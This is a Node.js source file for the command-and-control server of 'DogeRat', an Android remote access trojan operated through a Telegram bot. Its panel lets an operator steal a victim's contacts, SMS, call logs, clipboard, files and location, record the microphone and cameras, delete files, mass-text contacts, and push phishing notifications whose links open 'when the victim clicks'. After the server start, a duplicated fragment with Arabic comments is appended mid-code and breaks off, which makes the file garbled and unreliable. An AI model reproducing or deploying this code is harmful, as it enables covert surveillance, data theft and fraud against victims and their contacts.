const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

// Load environment variables
require('dotenv').config();

// Configuration - Use environment variables or defaults
const token = process.env.TELEGRAM_BOT_TOKEN || '';
const id = process.env.TELEGRAM_CHAT_ID || '';
const address = process.env.PING_ADDRESS || 'https://www.google.com';
const PORT = process.env.PORT || 8999;

// Validate configuration
if (!token || token === 'telegram_bot_token_here') {
    console.error('ERROR: TELEGRAM_BOT_TOKEN is not configured!');
    console.error('Please set TELEGRAM_BOT_TOKEN environment variable');
}
if (!id || id === 'telegram_chatid-here') {
    console.warn('WARNING: TELEGRAM_CHAT_ID is not configured!');
    console.warn('Bot will not send messages to anyone until chat ID is set');
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    perMessageDeflate: false,
    clientTracking: true
});

let appBot = null;
try {
    appBot = new telegramBot(token, { polling: true });
    console.log('Telegram bot initialized successfully');
} catch (error) {
    console.error('Failed to initialize Telegram bot:', error.message);
}

const appClients = new Map();

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Health check endpoint
app.get('/', function (req, res) {
    res.send('<h1 align="center">DogeRat Server v1.0.0</h1><p>Status: Online</p>');
});

// Status endpoint
app.get('/status', function (req, res) {
    res.json({
        status: 'online',
        connectedDevices: appClients.size,
        uptime: process.uptime()
    });
});

// File upload endpoint
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No file uploaded');
        }
        
        const name = req.file.originalname || 'unknown_file';
        const model = req.headers.model || 'Unknown Device';
        
        if (appBot && id) {
            appBot.sendDocument(id, req.file.buffer, {
                caption: `°• 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚏𝚛𝚘𝚖 <b>${model}</b> 𝚍𝚎𝚟𝚒𝚌𝚎`,
                parse_mode: "HTML"
            }, {
                filename: name,
                contentType: 'application/octet-stream',
            }).catch(err => console.error('Error sending document:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Upload file error:', error.message);
        res.status(500).send('Error uploading file');
    }
});

// Text upload endpoint
app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || 'Unknown Device';
        const text = req.body['text'] || '';
        
        if (appBot && id) {
            appBot.sendMessage(id, `°• 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚏𝚛𝚘𝚖 <b>${model}</b> 𝚍𝚎𝚟𝚒𝚌𝚎\n\n` + text, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('Error sending message:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Upload text error:', error.message);
        res.status(500).send('Error uploading text');
    }
});

// Location upload endpoint
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body['lat'];
        const lon = req.body['lon'];
        const model = req.headers.model || 'Unknown Device';
        
        if (appBot && id && lat && lon) {
            appBot.sendLocation(id, lat, lon).catch(err => console.error('Error sending location:', err.message));
            appBot.sendMessage(id, `°• 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚏𝚛𝚘𝚖 <b>${model}</b> 𝚍𝚎𝚟𝚒𝚌𝚎`, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('Error sending location message:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Upload location error:', error.message);
        res.status(500).send('Error uploading location');
    }
});

// WebSocket connection handling
appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || 'Unknown Device';
        const battery = req.headers.battery || '0';
        const version = req.headers.version || 'Unknown';
        const brightness = req.headers.brightness || '0';
        const provider = req.headers.provider || 'Unknown';

        ws.uuid = uuid;
        ws.isAlive = true;
        
        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            connectedAt: new Date().toISOString()
        });
        
        console.log(`Device connected: ${model} (${uuid})`);
        
        if (appBot && id) {
            appBot.sendMessage(id,
                `°• 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>\n` +
                `• إصدار أندرويد : <b>${version}</b>\n` +
                `• سطوع الشاشة : <b>${brightness}</b>\n` +
                `• المزود : <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(err => console.error('Error sending connection message:', err.message));
        }

        ws.on('pong', () => {
            ws.isAlive = true;
        });

        ws.on('close', function () {
            console.log(`Device disconnected: ${model} (${uuid})`);
            
            if (appBot && id) {
                appBot.sendMessage(id,
                    `°• 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍\n\n` +
                    `• موديل الجهاز : <b>${model}</b>\n` +
                    `• البطارية : <b>${battery}</b>\n` +
                    `• إصدار أندرويد : <b>${version}</b>\n` +
                    `• سطوع الشاشة : <b>${brightness}</b>\n` +
                    `• المزود : <b>${provider}</b>`,
                    { parse_mode: "HTML" }
                ).catch(err => console.error('Error sending disconnection message:', err.message));
            }
            appClients.delete(ws.uuid);
        });

        ws.on('error', function (error) {
            console.error(`WebSocket error for ${model}:`, error.message);
        });
        
    } catch (error) {
        console.error('Connection handling error:', error.message);
    }
});

// Heartbeat to detect disconnected clients
const heartbeatInterval = setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log(`Terminating dead connection: ${ws.uuid}`);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

appSocket.on('close', () => {
    clearInterval(heartbeatInterval);
});

// Telegram bot message handling
if (appBot) {
    appBot.on('message', (message) => {
        try {
            const chatId = message.chat.id;
            
            // Handle reply messages
            if (message.reply_to_message) {
                handleReplyMessage(message, chatId);
            }
            
            // Handle command messages
            if (id && chatId.toString() === id.toString()) {
                handleCommandMessage(message, chatId);
            } else if (message.text === '/start' || message.text?.startsWith('/')) {
                // Only allow commands from unauthorized users for /start
                if (message.text === '/start') {
                    appBot.sendMessage(chatId,
                        '°• 𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍\n\n' +
                        '• هذا البوت خاص. اتصل بالمسؤول للوصول.',
                        { parse_mode: "HTML" }
                    ).catch(err => console.error('Error:', err.message));
                }
            }
        } catch (error) {
            console.error('Message handling error:', error.message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        try {
            handleCallbackQuery(callbackQuery);
        } catch (error) {
            console.error('Callback query error:', error.message);
        }
    });

    appBot.on('error', (error) => {
        console.error('Bot error:', error.message);
    });

    appBot.on('polling_error', (error) => {
        console.error('Polling error:', error.message);
    });
}

function handleReplyMessage(message, chatId) {
    if (!id || chatId.toString() !== id.toString()) return;
    
    const replyText = message.reply_to_message?.text || '';
    
    if (replyText.includes('°• 𝙿𝚕𝚎𝚊𝚜𝚎 𝚛𝚎𝚙𝚕𝚢 𝚝𝚑𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚘 𝚠𝚑𝚒𝚌𝚑 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚑𝚎 𝚂𝙼𝚂')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
            '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('Error:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
        sendToDevice(currentUuid, `send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜')) {
        sendToDevice(currentUuid, `send_message_to_all:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍')) {
        sendToDevice(currentUuid, `file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚎𝚕𝚎𝚝𝚎')) {
        sendToDevice(currentUuid, `delete_file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍')) {
        const duration = parseInt(message.text);
        if (!isNaN(duration) && duration > 0) {
            sendToDevice(currentUuid, `microphone:${duration}`);
        } else {
            appBot.sendMessage(id, '°• مدة غير صالحة. يرجى إدخال رقم صحيح بالثواني.').catch(() => {});
        }
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚖𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍')) {
        sendToDevice(currentUuid, `rec_camera_main:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚜𝚎𝚕𝚏𝚒𝚎 𝚌𝚊𝚖𝚎𝚛𝚊 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍')) {
        sendToDevice(currentUuid, `rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚘𝚗 𝚝𝚑𝚎 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚎𝚟𝚒𝚌𝚎')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
            '• عندما ينقر الضحية على الإشعار، سيتم فتح الرابط الذي تدخله',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('Error:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار')) {
        sendToDevice(currentUuid, `show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚊𝚞𝚍𝚒𝚘 𝚕𝚒𝚗𝚔 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚙𝚕𝚊𝚢')) {
        sendToDevice(currentUuid, `play_audio:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
}

function handleCommandMessage(message, chatId) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝚊𝚝 𝚙𝚊𝚗𝚎𝚕\n\n' +
            '• إذا كان التطبيق مثبتاً على الجهاز المستهدف، انتظر الاتصال\n\n' +
            '• عندما تتلقى رسالة الاتصال، فهذا يعني أن الجهاز المستهدف متصل وجاهز لتلقي الأوامر\n\n' +
            '• انقر على زر الأوامر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب من بين الأوامر\n\n' +
            '• إذا علقت في مكان ما في البوت، أرسل أمر /start',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('Error:', err.message));
    }
    
    if (message.text === 'الأجهزة المتصلة') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• 𝙽𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚗𝚐 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('Error:', err.message));
        } else {
            let text = '°• 𝙻𝚒𝚜𝚝 𝚘𝚏 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 :\n\n';
            appClients.forEach(function (value, key, map) {
                text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                    `• البطارية : <b>${value.battery}</b>\n` +
                    `• إصدار أندرويد : <b>${value.version}</b>\n` +
                    `• سطوع الشاشة : <b>${value.brightness}</b>\n` +
                    `• المزود : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" }).catch(err => console.error('Error:', err.message));
        }
    }
    
    if (message.text === 'تنفيذ أمر') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• 𝙽𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚗𝚐 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('Error:', err.message));
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key, map) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الأمر', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(err => console.error('Error:', err.message));
        }
    }
}

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (!id) return;

    const commandHandlers = {
        'device': () => {
            const deviceInfo = appClients.get(uuid);
            if (!deviceInfo) {
                appBot.sendMessage(id, '°• الجهاز غير موجود أو منفصل').catch(() => {});
                return;
            }
            appBot.editMessageText(`°• حدد أمراً للجهاز : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'التطبيقات', callback_data: `apps:${uuid}` },
                            { text: 'معلومات الجهاز', callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: 'جلب ملف', callback_data: `file:${uuid}` },
                            { text: 'حذف ملف', callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: 'الحافظة', callback_data: `clipboard:${uuid}` },
                            { text: 'الميكروفون', callback_data: `microphone:${uuid}` },
                        ],
                        [
                            { text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` },
                            { text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: 'الموقع', callback_data: `location:${uuid}` },
                            { text: 'رسالة توست', callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: 'المكالمات', callback_data: `calls:${uuid}` },
                            { text: 'جهات الاتصال', callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: 'اهتزاز', callback_data: `vibrate:${uuid}` },
                            { text: 'إظهار إشعار', callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: 'الرسائل', callback_data: `messages:${uuid}` },
                            { text: 'إرسال رسالة', callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: 'تشغيل صوت', callback_data: `play_audio:${uuid}` },
                            { text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}` },
                        ],
                        [
                            {
                                text: 'إرسال رسالة لجميع جهات الاتصال',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(err => console.error('Error:', err.message));
        },
        'calls': () => {
            sendToDevice(uuid, 'calls');
            deleteAndSendProcessing(msg.message_id);
        },
        'contacts': () => {
            sendToDevice(uuid, 'contacts');
            deleteAndSendProcessing(msg.message_id);
        },
        'messages': () => {
            sendToDevice(uuid, 'messages');
            deleteAndSendProcessing(msg.message_id);
        },
        'apps': () => {
            sendToDevice(uuid, 'apps');
            deleteAndSendProcessing(msg.message_id);
        },
        'device_info': () => {
            sendToDevice(uuid, 'device_info');
            deleteAndSendProcessing(msg.message_id);
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• 𝙿𝚕𝚎𝚊𝚜𝚎 𝚛𝚎𝚙𝚕𝚢 𝚝𝚑𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚘 𝚠𝚑𝚒𝚌𝚑 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚑𝚎 𝚂𝙼𝚂\n\n' +
                '• إذا كنت تريد إرسال رسالة نصية قصيرة إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، وإلا أدخل الرقم مع رمز الدولة',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜\n\n' +
                '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لاستلام ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚎𝚕𝚎𝚝𝚎\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍\n\n' +
                '• لاحظ أنه يجب عليك إدخال الوقت رقمياً بوحدات الثواني',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚘𝚗 𝚝𝚑𝚎 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚎𝚟𝚒𝚌𝚎\n\n' +
                '• رسالة التوست هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗\n\n' +
                '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚊𝚞𝚍𝚒𝚘 𝚕𝚒𝚗𝚔 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚙𝚕𝚊𝚢\n\n' +
                '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• 𝚈𝚘𝚞𝚛 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚒𝚜 𝚘𝚗 𝚙𝚛𝚘𝚌𝚎𝚜𝚜\n\n' +
            '• ستتلقى رداً في اللحظات القليلة القادمة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('Error:', err.message));
    }
}

// Keep-alive ping
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // Optional: Keep server awake by pinging external service
    if (address) {
        axios.get(address).catch(() => {
            // Ignore errors from ping
        });
    }
}, 5000);

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM signal received: closing HTTP server');
    appServer.close(() => {
        console.log('HTTP server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('SIGINT signal received: closing HTTP server');
    appServer.close(() => {
        console.log('HTTP server closed');
        process.exit(0);
    });
});

// Start server
appServer.listen(PORT, () => {
    console.log(`DogeRat Server v1.0.0 running on port ${PORT}`);
    console.log(`Connected devices will appear here`);
});
        
        if (appBot && id) {
            appBot.sendMessage(id, `°• رسالة من جهاز <b>${model}</b>\n\n` + text, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال الرسالة:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع النص:', error.message);
        res.status(500).send('خطأ في رفع النص');
    }
});

// نقطة رفع الموقع
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body['lat'];
        const lon = req.body['lon'];
        const model = req.headers.model || 'جهاز غير معروف';
        
        if (appBot && id && lat && lon) {
            appBot.sendLocation(id, lat, lon).catch(err => console.error('خطأ في إرسال الموقع:', err.message));
            appBot.sendMessage(id, `°• موقع من جهاز <b>${model}</b>`, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال رسالة الموقع:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع الموقع:', error.message);
        res.status(500).send('خطأ في رفع الموقع');
    }
});

// معالجة اتصال WebSocket
appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || 'جهاز غير معروف';
        const battery = req.headers.battery || '0';
        const version = req.headers.version || 'غير معروف';
        const brightness = req.headers.brightness || '0';
        const provider = req.headers.provider || 'غير معروف';

        ws.uuid = uuid;
        ws.isAlive = true;
        
        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            connectedAt: new Date().toISOString()
        });
        
        console.log(`جهاز متصل: ${model} (${uuid})`);
        
        if (appBot && id) {
            appBot.sendMessage(id,
                `°• تم اتصال جهاز جديد\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>\n` +
                `• إصدار أندرويد : <b>${version}</b>\n` +
                `• سطوع الشاشة : <b>${brightness}</b>\n` +
                `• المزود : <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(err => console.error('خطأ في إرسال رسالة الاتصال:', err.message));
        }

        ws.on('pong', () => {
            ws.isAlive = true;
        });

        ws.on('close', function () {
            console.log(`فصل الجهاز: ${model} (${uuid})`);
            
            if (appBot && id) {
                appBot.sendMessage(id,
                    `°• تم فصل الجهاز\n\n` +
                    `• موديل الجهاز : <b>${model}</b>\n` +
                    `• البطارية : <b>${battery}</b>\n` +
                    `• إصدار أندرويد : <b>${version}</b>\n` +
                    `• سطوع الشاشة : <b>${brightness}</b>\n` +
                    `• المزود : <b>${provider}</b>`,
                    { parse_mode: "HTML" }
                ).catch(err => console.error('خطأ في إرسال رسالة الفصل:', err.message));
            }
            appClients.delete(ws.uuid);
        });

        ws.on('error', function (error) {
            console.error(`خطأ WebSocket للجهاز ${model}:`, error.message);
        });
        
    } catch (error) {
        console.error('خطأ في معالجة الاتصال:', error.message);
    }
});

// نبضات القلب للكشف عن العملاء المنفصلين
const heartbeatInterval = setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log(`إنهاء الاتصال الميت: ${ws.uuid}`);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

appSocket.on('close', () => {
    clearInterval(heartbeatInterval);
});

// معالجة رسائل بوت التيليجرام
if (appBot) {
    appBot.on('message', (message) => {
        try {
            const chatId = message.chat.id;
            
            // معالجة رسائل الرد
            if (message.reply_to_message) {
                handleReplyMessage(message, chatId);
            }
            
